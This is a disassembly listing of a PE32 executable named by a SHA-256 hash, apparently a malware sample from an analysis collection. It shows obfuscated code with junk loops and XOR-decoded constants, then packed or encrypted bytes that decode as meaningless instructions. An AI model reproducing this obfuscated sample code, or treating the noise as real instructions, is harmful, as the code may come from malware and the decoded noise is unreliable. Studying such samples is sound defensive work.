
ce32c8f43d3f6e3997717ebb159cfc2dcd974ef1743df754381678297b91bd30.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xb4
  401009:	sub    DWORD PTR ds:0x428e87,ecx
  40100f:	mov    eax,DWORD PTR [ebp+0x8]
  401012:	push   ebx
  401013:	add    DWORD PTR ds:0x428e87,edi
  401019:	push   esi
  40101a:	push   edi
  40101b:	mov    DWORD PTR ds:0x428e9b,0x10
  401025:	cmp    DWORD PTR ds:0x428e9b,0x0
  40102c:	je     0x40107b
  401032:	cmp    DWORD PTR ds:0x428e9b,0x3
  401039:	jb     0x40107b
  40103f:	jmp    0x40104f
  401044:	push   0x428000
  401049:	call   DWORD PTR ds:0x42a9eb
  40104f:	cmp    DWORD PTR ds:0x428e9b,0x4
  401056:	jne    0x401069
  40105c:	mov    edi,DWORD PTR ds:0x428e9b
  401062:	dec    edi
  401063:	mov    DWORD PTR ds:0x428e9b,edi
  401069:	mov    edi,DWORD PTR ds:0x428e9b
  40106f:	dec    edi
  401070:	mov    DWORD PTR ds:0x428e9b,edi
  401076:	jmp    0x401025
  40107b:	mov    esi,0x75108af
  401080:	xor    eax,esi
  401082:	mov    DWORD PTR ds:0x428e87,0x16
  40108c:	cmp    DWORD PTR ds:0x428e87,0x0
  401093:	je     0x4010c8
  401099:	cmp    DWORD PTR ds:0x428e87,0x25
  4010a0:	jge    0x4010c8
  4010a6:	jmp    0x4010b6
  4010ab:	push   0x428189
  4010b0:	call   DWORD PTR ds:0x42a9ef
  4010b6:	mov    ecx,DWORD PTR ds:0x428e87
  4010bc:	dec    ecx
  4010bd:	mov    DWORD PTR ds:0x428e87,ecx
  4010c3:	jmp    0x40108c
  4010c8:	mov    edi,0x3272f6
  4010cd:	or     ecx,DWORD PTR ds:0x428ec7
  4010d3:	add    eax,edi
  4010d5:	mov    DWORD PTR [ebp-0x40],eax
  4010d8:	xor    eax,DWORD PTR ds:0x428e5f
  4010de:	mov    eax,ds:0x4281f3
  4010e3:	and    DWORD PTR ds:0x428ea7,0x31f0
  4010ed:	mov    eax,DWORD PTR [eax]
  4010ef:	sub    DWORD PTR ds:0x428e27,0x491
  4010f9:	mov    DWORD PTR [ebp-0x3c],eax
  4010fc:	mov    eax,ds:0x428403
  401101:	and    DWORD PTR ds:0x428e2f,ecx
  401107:	mov    eax,DWORD PTR [eax]
  401109:	mov    DWORD PTR [ebp-0x1c],eax
  40110c:	xor    DWORD PTR ds:0x428ec7,edx
  401112:	mov    DWORD PTR [ebp-0x34],0xf89c87a5
  401119:	and    DWORD PTR ds:0x428eb7,0x0
  401123:	jmp    0x401136
  401128:	xor    eax,eax
  40112a:	xor    eax,DWORD PTR ds:0x428eb7
  401130:	inc    eax
  401131:	mov    ds:0x428eb7,eax
  401136:	cmp    DWORD PTR ds:0x428eb7,0x14
  40113d:	jae    0x401165
  401143:	cmp    DWORD PTR ds:0x428eb7,0x1b
  40114a:	jl     0x401165
  401150:	jmp    0x401160
  401155:	push   0x83c7
  40115a:	call   DWORD PTR ds:0x42a9f3
  401160:	jmp    0x401128
  401165:	mov    eax,DWORD PTR [ebp-0x34]
  401168:	and    ecx,DWORD PTR ds:0x428e2f
  40116e:	xor    eax,esi
  401170:	add    ecx,DWORD PTR ds:0x428ebf
  401176:	add    eax,edi
  401178:	sub    DWORD PTR ds:0x428e8f,0x1eb6
  401182:	mov    DWORD PTR [ebp-0x40],eax
  401185:	mov    eax,ds:0x428373
  40118a:	mov    DWORD PTR [ebp-0x40],eax
  40118d:	mov    DWORD PTR ds:0x428e97,0x16
  401197:	cmp    DWORD PTR ds:0x428e97,0x0
  40119e:	je     0x4011e9
  4011a4:	cmp    DWORD PTR ds:0x428e97,0x6
  4011ab:	jbe    0x4011e9
  4011b1:	jmp    0x4011c1
  4011b6:	push   0x4280f7
  4011bb:	call   DWORD PTR ds:0x42a9fb
  4011c1:	cmp    DWORD PTR ds:0x428e97,0x7
  4011c8:	jne    0x4011d9
  4011ce:	mov    eax,ds:0x428e97
  4011d3:	dec    eax
  4011d4:	mov    ds:0x428e97,eax
  4011d9:	mov    eax,ds:0x428e97
  4011de:	dec    eax
  4011df:	mov    ds:0x428e97,eax
  4011e4:	jmp    0x401197
  4011e9:	mov    eax,DWORD PTR [ebp-0x3c]
  4011ec:	sbb    DWORD PTR ds:0x428ea7,0x187d
  4011f6:	mov    DWORD PTR [ebp-0x14],eax
  4011f9:	not    eax
  4011fb:	mov    eax,DWORD PTR [ebp-0x14]
  4011fe:	push   0x4
  401200:	mov    DWORD PTR ds:0x428e83,0x1e
  40120a:	cmp    DWORD PTR ds:0x428e83,0x0
  401211:	je     0x401260
  401217:	cmp    DWORD PTR ds:0x428e83,0x7
  40121e:	jle    0x401260
  401224:	jmp    0x401234
  401229:	push   0x2582
  40122e:	call   DWORD PTR ds:0x42a9ff
  401234:	cmp    DWORD PTR ds:0x428e83,0x8
  40123b:	jne    0x40124e
  401241:	mov    ecx,DWORD PTR ds:0x428e83
  401247:	dec    ecx
  401248:	mov    DWORD PTR ds:0x428e83,ecx
  40124e:	mov    ecx,DWORD PTR ds:0x428e83
  401254:	dec    ecx
  401255:	mov    DWORD PTR ds:0x428e83,ecx
  40125b:	jmp    0x40120a
  401260:	pop    ecx
  401261:	sub    ecx,eax
  401263:	sub    eax,0x50fd
  401268:	add    ecx,DWORD PTR [ebp-0x1c]
  40126b:	mov    DWORD PTR [ebp-0x2c],0xf89c85e5
  401272:	mov    DWORD PTR ds:0x428e63,0x13
  40127c:	cmp    DWORD PTR ds:0x428e63,0x0
  401283:	je     0x4012b6
  401289:	cmp    DWORD PTR ds:0x428e63,0x16
  401290:	jb     0x4012b6
  401296:	jmp    0x4012a6
  40129b:	push   0x428000
  4012a0:	call   DWORD PTR ds:0x42aa03
  4012a6:	mov    eax,ds:0x428e63
  4012ab:	dec    eax
  4012ac:	mov    ds:0x428e63,eax
  4012b1:	jmp    0x40127c
  4012b6:	mov    DWORD PTR [ebp-0x18],ecx
  4012b9:	movzx  eax,WORD PTR ds:0x428e73
  4012c0:	sub    DWORD PTR ds:0x428e93,eax
  4012c6:	mov    DWORD PTR [ebp-0xa0],0xf89c85a1
  4012d0:	mov    eax,DWORD PTR [ebp-0x14]
  4012d3:	xor    DWORD PTR ds:0x428ec7,0x428e57
  4012dd:	mov    DWORD PTR [ebp-0x9c],eax
  4012e3:	mov    eax,DWORD PTR [ebp-0x18]
  4012e6:	mov    DWORD PTR [ebp-0x98],eax
  4012ec:	mov    eax,DWORD PTR [ebp-0x2c]
  4012ef:	adc    DWORD PTR ds:0x428ec7,0x7160
  4012f9:	xor    eax,esi
  4012fb:	sbb    DWORD PTR ds:0x428e3b,0x6908
  401305:	add    eax,edi
  401307:	or     DWORD PTR ds:0x428e2b,0x5a5f
  401311:	mov    DWORD PTR [ebp-0x94],eax
  401317:	not    DWORD PTR ds:0x428e47
  40131d:	lea    eax,[ebp-0x48]
  401320:	mov    DWORD PTR [ebp-0x90],eax
  401326:	adc    DWORD PTR ds:0x428ea7,edx
  40132c:	mov    eax,DWORD PTR [ebp-0xa0]
  401332:	or     DWORD PTR ds:0x428e57,0x428e77
  40133c:	xor    eax,esi
  40133e:	or     DWORD PTR ds:0x428e7f,0x24f1
  401348:	add    eax,edi
  40134a:	or     DWORD PTR ds:0x428e73,0x428e63
  401354:	mov    DWORD PTR [ebp-0xa0],eax
  40135a:	adc    DWORD PTR ds:0x428e63,0x428e67
  401364:	lea    eax,[ebp-0xa0]
  40136a:	push   eax
  40136b:	neg    eax
  40136d:	mov    eax,DWORD PTR [ebp+0xc]
  401370:	sub    DWORD PTR ds:0x428ecf,0x428e77
  40137a:	xor    eax,esi
  40137c:	xor    DWORD PTR ds:0x428ecf,0x428e67
  401386:	add    eax,edi
  401388:	sub    DWORD PTR ds:0x428e9f,0x428e77
  401392:	push   eax
  401393:	mov    eax,ds:0x428393
  401398:	add    DWORD PTR ds:0x428e73,0x428eb7
  4013a2:	push   0x4282e9
  4013a7:	or     DWORD PTR ds:0x428e47,0x49f0
  4013b1:	push   DWORD PTR [eax]
  4013b3:	or     DWORD PTR ds:0x428e47,0x428e5b
  4013bd:	call   0x4061d0
  4013c2:	sbb    edx,0x761a
  4013c8:	mov    ebx,DWORD PTR [ebp-0x14]
  4013cb:	adc    eax,edx
  4013cd:	mov    eax,DWORD PTR [ebp-0x18]
  4013d0:	mov    edx,DWORD PTR ds:0x428ec7
  4013d6:	adc    edx,DWORD PTR ds:0x428e37
  4013dc:	mov    DWORD PTR ds:0x428ec7,edx
  4013e2:	mov    DWORD PTR [ebp-0x58],eax
  4013e5:	movzx  eax,WORD PTR ds:0x428e5f
  4013ec:	and    DWORD PTR ds:0x428e23,eax
  4013f2:	mov    DWORD PTR [ebp-0x34],0xf89c853c
  4013f9:	mov    eax,0xf89c85a3
  4013fe:	mov    DWORD PTR [ebp-0x1c],eax
  401401:	sbb    DWORD PTR ds:0x428ec7,0x20b
  40140b:	lea    ecx,[eax+0x2]
  40140e:	sbb    DWORD PTR ds:0x428e87,ebx
  401414:	mov    DWORD PTR [ebp-0x28],ecx
  401417:	mov    DWORD PTR [ebp-0x10],0xf89c85a4
  40141e:	sbb    edx,0x4ac2
  401424:	mov    DWORD PTR [ebp-0x8],eax
  401427:	sbb    DWORD PTR ds:0x428ecb,edx
  40142d:	mov    eax,DWORD PTR [ebp-0x10]
  401430:	and    DWORD PTR ds:0x428eb7,0x0
  40143a:	mov    edx,DWORD PTR ds:0x428eb7
  401440:	inc    edx
  401441:	mov    DWORD PTR ds:0x428eb7,edx
  401447:	cmp    DWORD PTR ds:0x428eb7,0x21
  40144e:	jbe    0x401471
  401454:	jmp    0x401464
  401459:	push   0x73f7
  40145e:	call   DWORD PTR ds:0x42aa07
  401464:	cmp    DWORD PTR ds:0x428eb7,0x19
  40146b:	jb     0x40143a
  401471:	xor    eax,esi
  401473:	mov    edx,0xffcd8d8a
  401478:	add    DWORD PTR ds:0x428ec3,0x428e5b
  401482:	sub    edx,eax
  401484:	mov    DWORD PTR ds:0x428e43,0xef0
  40148e:	mov    DWORD PTR [ebp-0xc],edx
  401491:	not    eax
  401493:	mov    DWORD PTR [ebp-0x18],0xf89c85a0
  40149a:	mov    eax,DWORD PTR [ebp-0x8]
  40149d:	mov    DWORD PTR [ebp-0x3c],ebx
  4014a0:	mov    DWORD PTR ds:0x428e7f,0x7ee3
  4014aa:	cmp    eax,ecx
  4014ac:	mov    DWORD PTR ds:0x428ea7,0x6a4b
  4014b6:	je     0x403bac
  4014bc:	jmp    0x403815
  4014c1:	mov    ebp,0x855ffdc7
  4014c6:	inc    ebp
  4014c7:	popf   
  4014c8:	test   DWORD PTR [eax-0x3c58fa21],esi
  4014ce:	jnp    0x4014e6
  4014d0:	sbb    BYTE PTR [ebx+0x47838383],al
  4014d6:	pusha  
  4014d7:	add    DWORD PTR [ebx+0x3e28312a],0x26
  4014de:	cmp    ah,BYTE PTR [eax+esi*1]
  4014e1:	jp     0x401520
  4014e3:	jbe    0x40155c
  4014e5:	test   DWORD PTR [ebx+0x72],esi
  4014e8:	jae    0x40155c
  4014ea:	dec    ebx
  4014eb:	(bad)  
  4014ed:	(bad)  
  4014ee:	ins    DWORD PTR es:[edi],dx
  4014ef:	push   ebp
  4014f0:	je     0x401570
  4014f2:	lods   eax,DWORD PTR fs:[esi]
  4014f4:	jge    0x401568
  4014f6:	data16 shl BYTE PTR [edx+0x53],1
  4014fa:	cmp    eax,0x87980391
  4014ff:	push   0x8d488052
  401504:	mov    bh,0x80
  401506:	mov    ebp,0x3144bb
  40150b:	ja     0x4014ee
  40150d:	add    ebp,DWORD PTR [eax+eax*4+0x1f]
  401511:	repnz inc esi
  401513:	rol    bl,cl
  401515:	repnz cwde 
  401517:	sub    al,0xdf
  401519:	xchg   esp,eax
  40151a:	adc    BYTE PTR ss:[esi-0x4c],ah
  40151e:	xchg   ebx,eax
  40151f:	(bad)  [eax]
  401521:	jb     0x401505
  401523:	sbb    ecx,ebp
  401525:	lsl    esi,WORD PTR [edi]
  401528:	and    eax,0x74371155
  40152d:	jne    0x4014f5
  40152f:	mov    al,0x2c
  401531:	pop    esi
  401532:	sbb    dh,BYTE PTR [edi+0x3456f600]
  401538:	mov    DWORD PTR [ebx-0x2b],ecx
  40153b:	fs push es
  40153d:	and    eax,DWORD PTR [ebx]
  40153f:	test   DWORD PTR [esi+0x60a5e27c],edi
  401545:	xchg   esp,eax
  401546:	mov    esi,0x4e9b2918
  40154b:	or     al,0x9f
  40154d:	inc    ecx
  40154e:	mov    ecx,DWORD PTR [esp+edx*1-0x6d94cd1d]
  401555:	dec    ecx
  401556:	dec    esp
  401557:	imul   edi,esp,0x963693d0
  40155d:	int    0xc8
  40155f:	rcl    DWORD PTR [ebp+0x6b5af96e],1
  401565:	push   ecx
  401566:	adc    DWORD PTR [edi],edi
  401568:	or     al,0x47
  40156a:	sbb    al,0xb2
  40156c:	push   esp
  40156d:	sar    DWORD PTR [eax+0x6719dd4d],cl
  401573:	add    ch,BYTE PTR [ebx+0x67]
  401576:	mov    edx,0x5c07506
  40157b:	pop    ebx
  40157c:	sbb    al,0x20
  40157e:	cmp    eax,0x3d40234f
  401583:	popf   
  401584:	jmp    0x5faa:0x9fdab89c
  40158b:	adc    ebp,DWORD PTR [ebp+ecx*1-0x7ee0e7c4]
  401592:	mov    esi,0x738f9b39
  401597:	mov    ah,0xd6
  401599:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40159a:	mov    eax,?
  40159c:	pop    ebx
  40159d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40159e:	cli    
  40159f:	jmp    0x9a810613
  4015a4:	loope  0x40155c
  4015a6:	mov    ds:0xa0b1012e,eax
  4015ab:	loope  0x401538
  4015ad:	ret    0xf02b
  4015b0:	or     ecx,edx
  4015b2:	push   ecx
  4015b3:	nop
  4015b4:	add    dl,bh
  4015b6:	mov    ch,0xfd
  4015b8:	(bad)  
  4015ba:	xor    al,0x2f
  4015bc:	mov    edx,ss
  4015be:	aad    0xe8
  4015c0:	mov    al,0x92
  4015c2:	(bad)  
  4015c4:	aas    
  4015c5:	arpl   WORD PTR [esi+0x43],ax
  4015c8:	push   edi
  4015c9:	xor    DWORD PTR [esi-0xb],edx
  4015cc:	shr    DWORD PTR [ebp+0x5c],0x1f
  4015d0:	cmp    al,0x90
  4015d2:	daa    
  4015d3:	ret    0x90bd
  4015d6:	int3   
  4015d7:	clc    
  4015d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4015d9:	sbb    al,0x45
  4015db:	xchg   esp,eax
  4015dc:	or     eax,0x567455bb
  4015e1:	sbb    BYTE PTR [eax],0x7e
  4015e4:	mov    al,0x94
  4015e6:	(bad)  
  4015e7:	mov    bl,0xf2
  4015e9:	lods   al,BYTE PTR ds:[esi]
  4015ea:	adc    DWORD PTR [edi+0x43],edx
  4015ed:	retf   0x229d
  4015f0:	les    ebp,FWORD PTR [edi-0x23]
  4015f3:	and    eax,0x56537902
  4015f8:	pop    eax
  4015f9:	jo     0x401581
  4015fb:	cmp    al,0xa8
  4015fd:	mov    esp,0xae79acb6
  401602:	inc    esi
  401603:	jnp    0x4015b7
  401605:	adc    esi,edx
  401607:	adc    al,0x42
  401609:	(bad)  [edx-0x38]
  40160c:	xchg   ebp,eax
  40160d:	sub    ebx,esp
  40160f:	cmp    eax,edx
  401611:	push   0x63881924
  401616:	retf   0xa1ac
  401619:	ins    DWORD PTR es:[edi],dx
  40161a:	je     0x4015ea
  40161c:	add    al,0xd2
  40161e:	xor    DWORD PTR [esi-0x5d],0x12
  401622:	xor    edx,DWORD PTR [edx]
  401624:	std    
  401625:	mov    dl,0xb7
  401627:	les    esp,FWORD PTR [ebp+0x4]
  40162a:	adc    ebx,edi
  40162c:	sbb    ebp,0x6de0c8d7
  401632:	es push 0x27
  401635:	xor    DWORD PTR [ecx-0x7b9c2af7],esi
  40163b:	fucompp 
  40163d:	aam    0x6f
  40163f:	or     eax,0xe6835892
  401644:	push   es
  401645:	sbb    bl,ch
  401647:	adc    bl,al
  401649:	(bad)  
  40164b:	(bad)  
  40164d:	aam    0xbb
  40164f:	pop    es
  401650:	pop    eax
  401651:	pop    es
  401652:	jl     0x40164f
  401654:	pop    ds
  401655:	adc    edi,edi
  401657:	ss dec eax
  401659:	int    0xee
  40165b:	xlat   BYTE PTR ds:[ebx]
  40165c:	ja     0x40168d
  40165e:	ret    0x6aa3
  401661:	call   0xdb5c5d36
  401666:	ss mov bh,0x2d
  401669:	enter  0xaec2,0x47
  40166d:	dec    ecx
  40166e:	adc    ebx,DWORD PTR [esi+ebp*2]
  401671:	nop
  401672:	jae    0x4016a0
  401674:	int    0x33
  401676:	adc    DWORD PTR [esi-0x6dd1ea2],esp
  40167c:	adc    eax,edx
  40167e:	clc    
  40167f:	xor    eax,0x1b839f81
  401684:	inc    esi
  401685:	mov    dh,BYTE PTR [ecx+0x46]
  401688:	sbb    dl,BYTE PTR [ebx]
  40168a:	aam    0x3c
  40168c:	imul   edi,edx,0x70316a9d
  401692:	mov    ebx,0x3218f22f
  401697:	add    BYTE PTR [esp+eax*1],bh
  40169a:	pusha  
  40169b:	repnz inc ebp
  40169d:	shl    bl,0xae
  4016a0:	and    cl,cl
  4016a2:	fcomp  QWORD PTR [edi]
  4016a4:	mov    al,0xed
  4016a6:	jne    0x401662
  4016a8:	(bad)
  4016ac:	cs (bad) 
  4016ae:	jge    0x401703
  4016b0:	es mov esi,0xd8ea47b
  4016b6:	out    0x1d,eax
  4016b8:	pusha  
  4016b9:	pop    esp
  4016ba:	pop    ss
  4016bb:	and    al,0x7e
  4016bd:	sub    eax,0x292a03db
  4016c3:	sbb    BYTE PTR [edx],ah
  4016c5:	sbb    bh,dl
  4016c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016c8:	or     dh,BYTE PTR [eax+0x7a865bb8]
  4016ce:	stos   DWORD PTR es:[edi],eax
  4016cf:	pop    esi
  4016d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4016d1:	hlt    
  4016d2:	mov    al,0x74
  4016d4:	arpl   WORD PTR [ebp-0x4a],ax
  4016d7:	push   cs
  4016d8:	dec    edi
  4016d9:	inc    edx
  4016da:	cs imul ebp,esp,0x1ff6fc5c
  4016e1:	mul    BYTE PTR [ecx+0xe3daabb]
  4016e7:	shr    BYTE PTR [edx],1
  4016e9:	addr16 xchg ebx,eax
  4016eb:	jne    0x4016d5
  4016ed:	push   ecx
  4016ee:	les    esp,FWORD PTR [ebp+eax*2-0x36]
  4016f2:	retf   
  4016f3:	(bad)  
  4016f4:	mov    bh,0xa5
  4016f6:	gs dec di
  4016f9:	pop    esp
  4016fa:	dec    ah
  4016fc:	adc    bh,ah
  4016fe:	cmp    esp,DWORD PTR [edx+0x7c35d686]
  401704:	xor    BYTE PTR [edi],bl
  401706:	les    esi,FWORD PTR [eax-0x110b16cb]
  40170c:	jmp    0xead4d46f
  401711:	sub    BYTE PTR [edx+0x716b9a94],0x9f
  401718:	std    
  401719:	gs xor esp,edi
  40171c:	pushf  
  40171d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40171e:	mov    bl,0x19
  401720:	mov    eax,ds:0x40cfd160
  401725:	lea    eax,[ebp-0x61]
  401728:	xchg   ecx,eax
  401729:	adc    cl,BYTE PTR ds:0x339cfc80
  40172f:	bnd call DWORD PTR [esi]
  401732:	xor    eax,0xdeb254bc
  401737:	or     DWORD PTR [esi+eax*2-0x5939ba6f],0x3a
  40173f:	inc    edi
  401740:	push   cs
  401741:	or     BYTE PTR [ecx],0x52
  401744:	pop    eax
  401745:	data16 xor BYTE PTR [ecx+0x47],bh
  401749:	add    eax,0xc2a47d3b
  40174e:	mov    ebx,edx
  401750:	adc    eax,0x3ce6d8c6
  401755:	cmp    BYTE PTR ds:0xae028bba,ch
  40175b:	fs adc eax,0x93916ca4
  401761:	xchg   esi,eax
  401762:	(bad)  
  401763:	cs cmc 
  401765:	dec    esi
  401766:	inc    ebx
  401767:	out    dx,eax
  401768:	shr    al,cl
  40176a:	inc    eax
  40176b:	xadd   DWORD PTR [eax+0x4],ebx
  40176f:	lods   eax,DWORD PTR ds:[esi]
  401770:	push   esi
  401771:	sbb    eax,0xd001d492
  401776:	in     eax,dx
  401777:	xchg   edx,eax
  401778:	xor    al,0xb8
  40177a:	ss sbb eax,0x3c0247fc
  401780:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401781:	loopne 0x40174e
  401783:	adc    al,0xc1
  401785:	fwait
  401786:	aam    0x26
  401788:	dec    ecx
  401789:	sub    bh,BYTE PTR [eax-0x49]
  40178c:	test   al,0xe1
  40178e:	sbb    BYTE PTR [esi+0xc],dl
  401791:	push   edx
  401792:	(bad)  
  401793:	scas   eax,DWORD PTR es:[edi]
  401794:	int    0x4c
  401796:	dec    esp
  401797:	(bad)  [eax]
  401799:	sub    eax,0x73d1ca6d
  40179e:	and    ecx,DWORD PTR [edi+0x4f]
  4017a1:	lea    ecx,[esi]
  4017a3:	imul   DWORD PTR [eax-0x529f20a]
  4017a9:	addr16 retf 0xf2be
  4017ad:	jno    0x401819
  4017af:	fbstp  TBYTE PTR [eax]
  4017b1:	outs   dx,DWORD PTR ds:[esi]
  4017b2:	into   
  4017b3:	inc    ebp
  4017b4:	hlt    
  4017b5:	scas   al,BYTE PTR es:[edi]
  4017b6:	mov    al,ds:0xdec670e4
  4017bb:	push   ebx
  4017bc:	cwde   
  4017bd:	xchg   edi,eax
  4017be:	mov    eax,0x8d71e8d4
  4017c3:	leave  
  4017c4:	mov    ah,BYTE PTR [edx]
  4017c6:	push   ebp
  4017c7:	mov    ?,esi
  4017c9:	cld    
  4017ca:	ficom  WORD PTR [edi+0x20]
  4017cd:	push   edi
  4017ce:	mov    dl,0xa2
  4017d0:	push   ds
  4017d1:	fld    DWORD PTR [esi+0x41]
  4017d4:	add    al,0x89
  4017d6:	jmp    0x5fec:0x25d9b012
  4017dd:	aad    0x8c
  4017df:	fs ss into 
  4017e2:	cld    
  4017e3:	lahf   
  4017e4:	in     al,dx
  4017e5:	retf   0xd076
  4017e8:	gs jecxz 0x40177c
  4017eb:	ret    
  4017ec:	dec    edi
  4017ed:	ds dec ecx
  4017ef:	and    bl,BYTE PTR [esi+0x2d4c5ff]
  4017f5:	adc    al,0xd4
  4017f7:	fs push ds
  4017f9:	ss inc eax
  4017fb:	sub    ah,ch
  4017fd:	mov    dl,0xa8
  4017ff:	(bad)  
  401800:	push   ebx
  401801:	shl    DWORD PTR [ebx+0x44],0x51
  401805:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401806:	shr    ecx,0x33
  401809:	adc    edx,esi
  40180b:	stos   BYTE PTR es:[edi],al
  40180c:	or     BYTE PTR [eax+eiz*8+0x53196a66],bh
  401813:	mov    ds:0x6b0dea6f,al
  401818:	in     al,dx
  401819:	mov    esp,cs
  40181b:	ret    
  40181c:	jae    0x401867
  40181e:	ins    DWORD PTR es:[edi],dx
  40181f:	and    edi,eax
  401821:	sub    DWORD PTR [eax+eiz*1],ebp
  401824:	push   ecx
  401825:	sbb    ecx,DWORD PTR ds:0x279c8c53
  40182b:	xor    DWORD PTR ss:[ecx+esi*8+0x64b8eb00],0x79
  401834:	jecxz  0x4017b7
  401836:	push   ds
  401837:	xor    edi,DWORD PTR [ebp-0x46]
  40183a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40183b:	adc    eax,0x83c8030a
  401840:	adc    ch,dl
  401842:	push   ax
  401844:	jp     0x4017f3
  401846:	jb     0x4017f5
  401848:	xchg   ecx,eax
  401849:	xchg   esi,eax
  40184a:	add    ecx,DWORD PTR [ecx-0x19ece6e4]
  401850:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401851:	xchg   BYTE PTR [ebp+0x6a],dh
  401854:	adc    BYTE PTR [eax],bl
  401856:	int    0xca
  401858:	pop    ecx
  401859:	lds    ebx,FWORD PTR [edi-0x2b937971]
  40185f:	rcr    DWORD PTR [esp+esi*2],cl
  401862:	outs   dx,DWORD PTR ds:[esi]
  401863:	mov    bh,BYTE PTR [edx+eiz*1+0x25]
  401867:	mov    edx,0x94c83053
  40186c:	or     esi,DWORD PTR [edi]
  40186e:	ja     0x4018b0
  401870:	add    DWORD PTR [ecx+0x54],0xa98f07dd
  401877:	popf   
  401878:	push   ss
  401879:	imul   esp,DWORD PTR [ecx],0x998134f2
  40187f:	sbb    eax,0xc286ec12
  401884:	mov    ecx,0xe471f71
  401889:	or     edi,DWORD PTR [esi+0x2d800547]
  40188f:	or     al,0x25
  401891:	out    0xc4,al
  401893:	and    BYTE PTR [eax-0x2c],dl
  401896:	push   edx
  401897:	mov    bl,0x24
  401899:	aaa    
  40189a:	mov    al,ds:0x2b3aaa0c
  40189f:	stc    
  4018a0:	add    al,0xdc
  4018a2:	int3   
  4018a3:	cdq    
  4018a4:	push   es
  4018a5:	int    0x17
  4018a7:	icebp  
  4018a8:	cmp    ecx,ecx
  4018aa:	add    bl,ch
  4018ac:	retf   0xb0ba
  4018af:	out    dx,eax
  4018b0:	xchg   edi,eax
  4018b1:	push   ebp
  4018b2:	retf   0xf5fb
  4018b5:	loop   0x4018d8
  4018b7:	shl    ecx,0xf0
  4018ba:	js     0x401853
  4018bc:	in     al,dx
  4018bd:	adc    al,0x17
  4018bf:	mov    dl,0xd6
  4018c1:	jmp    FWORD PTR [eax*8+0x1621f591]
  4018c8:	add    eax,0x19454588
  4018cd:	ja     0x401874
  4018cf:	sbb    bh,bh
  4018d1:	add    BYTE PTR [ebx],0x8c
  4018d4:	add    BYTE PTR [esi-0x1a],ch
  4018d7:	jge    0x4018fe
  4018d9:	rcl    BYTE PTR [edx+0x23ffefed],0xf3
  4018e0:	out    0x37,al
  4018e2:	sub    esp,DWORD PTR [eax-0x9392e7f]
  4018e8:	xor    BYTE PTR [ecx+0x62],bl
  4018eb:	jns    0x4018ef
  4018ed:	(bad)  
  4018ee:	cli    
  4018ef:	push   ebx
  4018f0:	jge    0x401885
  4018f2:	leave  
  4018f3:	dec    ebx
  4018f4:	and    al,0x69
  4018f6:	test   al,0x17
  4018f8:	xchg   DWORD PTR [esi],eax
  4018fa:	inc    eax
  4018fb:	cs out 0xbd,eax
  4018fe:	add    edx,DWORD PTR [edx+eiz*2-0x59683413]
  401905:	sbb    dh,0x8b
  401908:	inc    ecx
  401909:	arpl   ax,cx
  40190b:	fiadd  WORD PTR [edi-0x61599660]
  401911:	fwait
  401912:	or     dh,BYTE PTR [edx+0x21]
  401915:	cmp    esi,0x85b4579f
  40191b:	add    BYTE PTR [ebx+ebp*2-0x73],dh
  40191f:	arpl   WORD PTR [edx],si
  401921:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401922:	mov    edx,0xe6267469
  401927:	aaa    
  401928:	xchg   ebx,eax
  401929:	push   ebp
  40192a:	add    cl,ah
  40192c:	das    
  40192d:	jecxz  0x401953
  40192f:	mov    DWORD PTR [eax-0x7d],ebp
  401932:	bnd jp 0x4018c6
  401935:	fistp  DWORD PTR [edx]
  401937:	inc    ecx
  401938:	mov    ds:0x2f55aab,eax
  40193d:	inc    edx
  40193e:	pop    eax
  40193f:	sbb    al,0xcf
  401941:	xor    ah,dh
  401943:	inc    edx
  401944:	xchg   ebp,eax
  401945:	int3   
  401946:	pop    esi
  401947:	out    dx,eax
  401948:	dec    edx
  401949:	adc    DWORD PTR [ecx+0x23],0xffffffd3
  40194d:	push   esi
  40194e:	shl    DWORD PTR [ebp-0x79],1
  401951:	xchg   esp,eax
  401952:	jecxz  0x401953
  401954:	fld    QWORD PTR [esi-0xe]
  401957:	and    BYTE PTR [edi],dh
  401959:	push   cs
  40195a:	sbb    al,0x39
  40195c:	jecxz  0x40194f
  40195e:	pop    eax
  40195f:	xor    BYTE PTR [edx-0x3f],dl
  401962:	push   ecx
  401963:	adc    cl,bl
  401965:	jo     0x40192d
  401967:	jg     0x4018ef
  401969:	inc    esi
  40196a:	retf   0xdd6a
  40196d:	ja     0x4019c8
  40196f:	sahf   
  401970:	and    esp,0xffffffe9
  401973:	push   ecx
  401974:	fcomp  DWORD PTR [ebx+0x74ec7356]
  40197a:	aaa    
  40197b:	(bad)  ds:0x40f9dad9
  401981:	fld    TBYTE PTR [ecx+0x5a56bb47]
  401987:	mov    edi,0xac359394
  40198c:	xor    ebp,esi
  40198e:	sub    edi,DWORD PTR [edi-0x80bf6a5]
  401994:	jbe    0x401a0a
  401996:	jbe    0x401946
  401998:	mov    ecx,0xfe87d93c
  40199d:	push   eax
  40199e:	in     al,dx
  40199f:	mov    BYTE PTR [ebx+0x9],ah
  4019a2:	rcl    edi,cl
  4019a4:	bound  esp,QWORD PTR [edx]
  4019a6:	mov    ah,0xce
  4019a8:	xchg   esi,eax
  4019aa:	ds jne 0x4019ed
  4019ad:	xchg   ebx,eax
  4019ae:	(bad)  
  4019af:	retf   
  4019b0:	dec    esp
  4019b1:	push   0x1b697529
  4019b6:	xchg   BYTE PTR [eax-0x117c7008],bh
  4019bc:	fnstcw WORD PTR [eax+edi*4+0xafa3264]
  4019c3:	imul   edi,eax,0xd170c0f7
  4019c9:	inc    esi
  4019ca:	jge    0x4019ed
  4019cc:	div    edi
  4019ce:	stc    
  4019cf:	mov    al,0x9f
  4019d1:	stos   BYTE PTR es:[edi],al
  4019d2:	pop    ds
  4019d3:	push   ebx
  4019d4:	jmp    0x5bb3:0x76c3fd5b
  4019db:	fld    st(2)
  4019dd:	out    0x76,al
